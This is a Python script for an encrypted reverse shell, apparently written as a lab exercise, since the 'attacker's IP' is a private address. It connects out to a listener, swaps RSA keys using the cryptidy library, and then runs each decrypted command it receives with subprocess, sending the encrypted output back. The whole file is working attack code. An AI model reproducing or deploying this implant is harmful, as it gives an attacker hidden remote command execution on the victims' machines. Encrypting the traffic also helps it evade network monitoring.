# pylint: disable=bare-except, missing-docstring, import-error
import socket
import subprocess
import os
from cryptidy import asymmetric_encryption

HOST = '10.0.2.4'  # Attacker's IP address
PORT = 12345  # Same port number used in the listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
print(f'target priv key: {priv_key}')
print(f'target pub key: {pub_key}')
s.send(pub_key.encode())

attacker_pub_key = s.recv(1024).decode()
print(f'attacker pub key: {attacker_pub_key}')

try:
    while True:
        encrypted_command = s.recv(1024)
        _, attacker_input = asymmetric_encryption.decrypt_message(encrypted_command, priv_key)
        print(f"attacker_input: {attacker_input}")
        if attacker_input == 'exit':
            s.close()
            break
        
        if attacker_input[0] == 'cd':
            if len(attacker_input) != 2:
                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
            else:
                os.chdir(attacker_input[1])
                s.send(b'\n')
        elif len(attacker_input) > 0:
            result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
            print(f"finished subprocess.run")
            result = result.stdout.decode()
            print(f"result: {result}")
            print(f"type(result): {type(result)}")
            print(f"len(result): {len(result)}")
            encrypted_output = asymmetric_encryption.encrypt_message(result, attacker_pub_key)
            print(len(encrypted_output))
            s.send(encrypted_output)
        else:
            s.send(b' ')
except Exception as e:
    print(f"e: {e}")
    s.close()
